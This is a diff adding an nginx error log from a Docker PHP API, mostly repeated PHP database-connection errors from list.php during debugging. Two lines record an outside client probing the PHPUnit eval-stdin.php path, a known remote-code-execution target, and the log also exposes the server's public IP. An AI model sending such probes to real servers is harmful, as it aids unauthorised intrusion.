+  thrown in /docker/home/flutter_api/list.php on line 15" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:44:17 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:15
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 15" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:44:21 [info] 32#32: *133 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:44:55 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $stmt in /docker/home/flutter_api/list.php on line 20PHP message: PHP Fatal error:  Uncaught Error: Call to a member function prepare() on null in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:44:58 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $stmt in /docker/home/flutter_api/list.php on line 20PHP message: PHP Fatal error:  Uncaught Error: Call to a member function prepare() on null in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:45:14 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $stmt in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:45:28 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:45:55 [info] 32#32: *138 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:46:06 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:46:37 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "db" in /docker/home/flutter_api/list.php:22
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:46:51 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined method mysqli::connection() in /docker/home/flutter_api/list.php:22
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:47:06 [info] 32#32: *144 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:47:12 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:22
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 22" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:48:12 [info] 32#32: *149 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:48:28 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db.db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db.db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Fatal error:  Uncaught Error: Object of class mysqli could not be converted to string in /docker/home/flutter_api/list.php:23
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:48:53 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:49:16 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 23PHP message: PHP Fatal error:  Uncaught Error: Call to a member function connect() on null in /docker/home/flutter_api/list.php:23
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:49:28 [info] 32#32: *152 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:49:44 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 23PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 23" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:50:06 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:50:15 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:50:26 [error] 32#32: *151 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:50:44 [info] 32#32: *157 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:51:34 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:51:53 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:52:11 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:52:15 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:52:18 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  Undefined variable $db in /docker/home/flutter_api/list.php on line 17PHP message: PHP Warning:  Attempt to read property "connection" on null in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:52:34 [info] 32#32: *163 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:52:46 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_api./db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_api./db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:53:10 [error] 32#32: *164 FastCGI sent in stderr: "PHP message: PHP Warning:  include(/docker/home/flutter_apiflutter_api/db/php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening '/docker/home/flutter_apiflutter_api/db/php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:53:46 [info] 32#32: *170 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:55:03 [info] 32#32: *181 client 165.22.20.192 closed keepalive connection
+2021/06/11 05:55:25 [error] 32#32: *175 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:55:34 [info] 32#32: *176 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:55:35 [error] 32#32: *175 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:55:57 [error] 32#32: *175 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:56:35 [info] 32#32: *184 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 06:46:20 [error] 32#32: *187 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 45.146.165.123, server: _, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "14.63.97.151:80"
+2021/06/11 06:46:22 [error] 32#32: *199 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 45.146.165.123, server: _, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "14.63.97.151:80"
+2021/06/11 07:10:52 [error] 32#32: *209 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 07:11:21 [error] 32#32: *209 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 07:11:22 [error] 32#32: *209 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 07:11:52 [info] 32#32: *210 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:17:28 [error] 32#32: *216 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:8
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 07:18:28 [info] 32#32: *217 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:24:45 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/06/11 07:24:45 [notice] 32#32: gracefully shutting down
+2021/06/11 07:24:45 [notice] 32#32: exiting
+2021/06/11 07:24:45 [notice] 32#32: exit
+2021/06/11 07:24:45 [notice] 1#1: signal 17 (SIGCHLD) received from 32
+2021/06/11 07:24:45 [notice] 1#1: worker process 32 exited with code 0
+2021/06/11 07:24:45 [notice] 1#1: exit
+2021/06/11 07:24:59 [notice] 1#1: using the "epoll" event method
+2021/06/11 07:24:59 [notice] 1#1: nginx/1.20.0
+2021/06/11 07:24:59 [notice] 1#1: built by gcc 10.2.1 20201203 (Alpine 10.2.1_pre1) 
+2021/06/11 07:24:59 [notice] 1#1: OS: Linux 5.8.0-55-generic
+2021/06/11 07:24:59 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/06/11 07:24:59 [notice] 1#1: start worker processes
+2021/06/11 07:24:59 [notice] 1#1: start worker process 24
+2021/06/11 07:28:44 [info] 24#24: *1 client 165.232.190.26 closed keepalive connection
+2021/06/11 07:38:23 [error] 24#24: *3 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:8
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:39:23 [info] 24#24: *4 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:39:57 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "hi" in /docker/home/flutter_api/list.php:41
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 41" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:40:04 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "hi" in /docker/home/flutter_api/list.php:41
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 41" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:40:28 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "hi" in /docker/home/flutter_api/list.php:41
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 41" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:40:57 [info] 24#24: *7 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:41:21 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:41:30 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:41:31 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:41:43 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined variable $stmt in /docker/home/flutter_api/list.php on line 20PHP message: PHP Fatal error:  Uncaught Error: Call to a member function prepare() on null in /docker/home/flutter_api/list.php:20
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 20" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:42:21 [info] 24#24: *16 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:43:06 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:43:14 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:43:21 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
+2021/06/11 07:43:23 [info] 24#24: *20 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 07:43:37 [error] 24#24: *6 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: PDO::$connection in /docker/home/flutter_api/list.php on line 16PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:16
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 16" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.5:9000", host: "localhost"
